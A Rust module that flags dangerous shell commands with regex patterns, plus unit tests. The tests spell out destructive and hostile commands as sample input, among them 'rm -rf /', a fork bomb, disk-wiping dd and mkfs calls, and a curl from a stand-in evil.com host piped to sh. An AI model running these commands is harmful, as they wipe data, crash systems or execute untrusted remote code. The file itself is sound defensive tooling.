use regex::Regex;
use std::sync::OnceLock;

#[derive(Debug)]
pub struct DangerResult {
    pub is_dangerous: bool,
    pub message: Option<String>,
}

static DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    (r"rm\s+-rf",          "Recursive force delete"),
    (r"sudo\s+",           "Elevated privileges required"),
    (r"chmod\s+777",       "Insecure file permissions"),
    (r"curl[^|]+\|\s*sh",  "Piping curl to shell"),
    (r"curl[^|]+\|\s*bash","Piping curl to bash"),
    (r">\s*/dev/sd",       "Writing to block device"),
    (r"mkfs",              "Filesystem formatting"),
    (r"dd\s+if=",          "Low-level disk operation"),
    (r":\(\)\{.*\}",       "Fork bomb detected"),
];

static COMPILED: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();

fn compiled() -> &'static [(Regex, &'static str)] {
    COMPILED.get_or_init(|| {
        DANGEROUS_PATTERNS
            .iter()
            .map(|(pat, msg)| (Regex::new(pat).expect("invalid regex pattern"), *msg))
            .collect()
    })
}

pub fn check(command: &str) -> DangerResult {
    for (re, msg) in compiled() {
        if re.is_match(command) {
            return DangerResult {
                is_dangerous: true,
                message: Some((*msg).to_string()),
            };
        }
    }
    DangerResult {
        is_dangerous: false,
        message: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_dangerous(command: &str, expected_msg: &str) {
        let result = check(command);
        assert!(result.is_dangerous, "expected '{}' to be dangerous", command);
        assert_eq!(result.message.as_deref(), Some(expected_msg));
    }

    fn assert_safe(command: &str) {
        let result = check(command);
        assert!(!result.is_dangerous, "expected '{}' to be safe", command);
    }

    #[test]
    fn test_rm_rf() {
        assert_dangerous("rm -rf /tmp/test", "Recursive force delete");
        assert_dangerous("rm -rf /", "Recursive force delete");
    }

    #[test]
    fn test_sudo() {
        assert_dangerous("sudo apt install vim", "Elevated privileges required");
        assert_dangerous("sudo rm file.txt", "Elevated privileges required");
    }

    #[test]
    fn test_chmod_777() {
        assert_dangerous("chmod 777 /etc/passwd", "Insecure file permissions");
        assert_dangerous("chmod 777 myfile", "Insecure file permissions");
    }

    #[test]
    fn test_curl_pipe_sh() {
        assert_dangerous("curl https://example.com/install.sh | sh", "Piping curl to shell");
        assert_dangerous("curl -s http://evil.com/script | sh", "Piping curl to shell");
    }

    #[test]
    fn test_curl_pipe_bash() {
        assert_dangerous("curl https://example.com/install.sh | bash", "Piping curl to bash");
        assert_dangerous("curl -sSL http://get.example.com | bash", "Piping curl to bash");
    }

    #[test]
    fn test_write_block_device() {
        assert_dangerous("cat file > /dev/sda", "Writing to block device");
        assert_dangerous("dd if=image.iso > /dev/sdb", "Writing to block device");
    }

    #[test]
    fn test_mkfs() {
        assert_dangerous("mkfs.ext4 /dev/sda1", "Filesystem formatting");
        assert_dangerous("mkfs -t ext4 /dev/sdb", "Filesystem formatting");
    }

    #[test]
    fn test_dd_if() {
        assert_dangerous("dd if=/dev/zero of=/dev/sda", "Low-level disk operation");
        assert_dangerous("dd if=backup.img of=/dev/sda bs=4M", "Low-level disk operation");
    }

    #[test]
    fn test_fork_bomb() {
        assert_dangerous(":(){ :|:& };:", "Fork bomb detected");
    }

    #[test]
    fn test_safe_commands() {
        assert_safe("ls -la");
        assert_safe("grep -r pattern .");
        assert_safe("cat file.txt");
        assert_safe("git status");
        assert_safe("cargo build");
        assert_safe("chmod 755 script.sh");
        assert_safe("rm file.txt");
    }
}
